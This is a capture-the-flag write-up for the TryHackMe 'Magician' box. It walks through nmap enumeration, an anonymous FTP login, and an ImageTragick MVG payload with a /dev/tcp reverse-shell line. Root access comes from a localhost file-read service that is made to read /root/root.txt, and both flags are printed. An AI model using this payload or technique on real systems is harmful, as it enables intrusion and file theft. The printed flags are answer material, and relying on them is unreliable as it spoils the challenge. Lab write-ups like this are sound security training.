## TRYHACKME - MAGICIAN

Another day, another rabbit hole full of magic tricks. This box (Magician) is themed around ImageMagick, and it's a fun one because the box practically hands you the exploit hint in the FTP banner. Let's get into it.

### Enumeration

Started off with the usual full port nmap scan:

```
nmap -Pn -sS -sV -sC -A -T4 -p- 10.48.162.203
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
8080/tcp open  http    Apache Tomcat (language: en)
8081/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: magician
```

Three ports of interest — FTP, an Apache Tomcat instance on 8080, and an nginx site on 8081 titled "magician". Started with FTP since it's the lowest hanging fruit.

### FTP - Anonymous Login

Tried anonymous login and at first it just hangs / gets interrupted. Turns out there's a `delay_successful_login` setting configured in `/etc/vsftpd.conf`, so you just have to be patient and let it sit:

```
ftp 10.48.162.203
Connected to 10.48.162.203.
220 THE MAGIC DOOR
Name (10.48.162.203:lightningf4st): anonymous
331 Please specify the password.
Password: 
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
230 Login successful.
```

Anddd there it is — the box literally drops a link to **ImageTragick (CVE-2016-3714)** in the login banner. Nice and direct, love it when a box tells you exactly what to go look at.

ImageTragick is the classic ImageMagick delegate RCE — if a service uses ImageMagick to process an uploaded image and it isn't patched/policy-restricted, you can smuggle a shell command into the image file itself via the MVG/SVG coders.

### Building the Exploit

The nginx site on 8081 confirms the theme — it's a "PNG to JPG converter" that "works like magic". That's the ImageMagick processing service. So the plan is: craft a malicious image with an embedded command, upload it through this converter, and catch a reverse shell.

Built the payload manually as an MVG file with an embedded delegate command:

```bash
cat > exploit.png << EOF
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/192.168.140.36/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
EOF
```

This abuses the `image` primitive's delegate handling in ImageMagick to run an arbitrary shell command when the file gets processed/converted.

### Catching the Shell

Set up a listener:

```bash
nc -nlvp 4444
```

Uploaded `exploit.png` through the "PNG to JPG converter" on port 8081, and the moment it got processed the shell dropped:

```
listening on [any] 4444 ...
connect to [192.168.140.36] from (UNKNOWN) [10.48.162.203] 60306
sh: cannot set terminal process group (1405): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami
whoami
magician
```

We're in as `magician`. Grabbed the user flag right away:

```
sh-4.4$ cd /home/magician
sh-4.4$ cat user.txt
cat user.txt
THM{simsalabim_hex_hex}
```

**FLAG 1 (user.txt): `THM{simsalabim_hex_hex}`**

### Privilege Escalation - Local Web App on 6666

Poked around for internal services with netstat:

```
sh-4.4$ netstat -tulnp
netstat -tulnp
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:6666          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8081            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      1405/java           
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
```

There's a service bound to localhost only on port 6666 — not reachable from outside, only from the box itself. Curled it locally:

```
sh-4.4$ curl -S http://127.0.0.1:6666
curl -S http://127.0.0.1:6666
```

Got back a page called "The Magic cat" — a form that takes a `filename` parameter. The name alone gives it away: it's basically `cat` wrapped in a web form, i.e. an LFI/arbitrary file read primitive, likely running as root since it's an internal-only service.

Sent a POST request pointing it at root's flag:

```
sh-4.4$ curl -X POST http://127.0.0.1:6666 -d "filename=/root/root.txt"
curl -X POST http://127.0.0.1:6666 -d "filename=/root/root.txt"
```

And the response came back with a page rendering the file contents:

```
<pre class="page-header">
GUZ{zntvp_znl_znxr_znal_zra_znq}
</pre>
```

### Decoding the Root Flag

The flag came back ROT13'd (`GUZ{...}` instead of `THM{...}` is the giveaway). Threw it into CyberChef with a ROT13 recipe:

```
Input:  GUZ{zntvp_znl_znxr_znal_zra_znq}
Output: THM{magic_may_make_many_men_mad}
```

**FLAG 2 (root.txt): `THM{magic_may_make_many_men_mad}`**

### Wrap-up

Solid box for practicing the ImageTragick delegate RCE end-to-end — the FTP banner basically hands you the CVE, the 8081 site is the vulnerable image converter, and privesc comes down to finding an internal-only "cat" service that reads files as root, with the flag itself hidden behind a simple ROT13.

Thanks for reading!
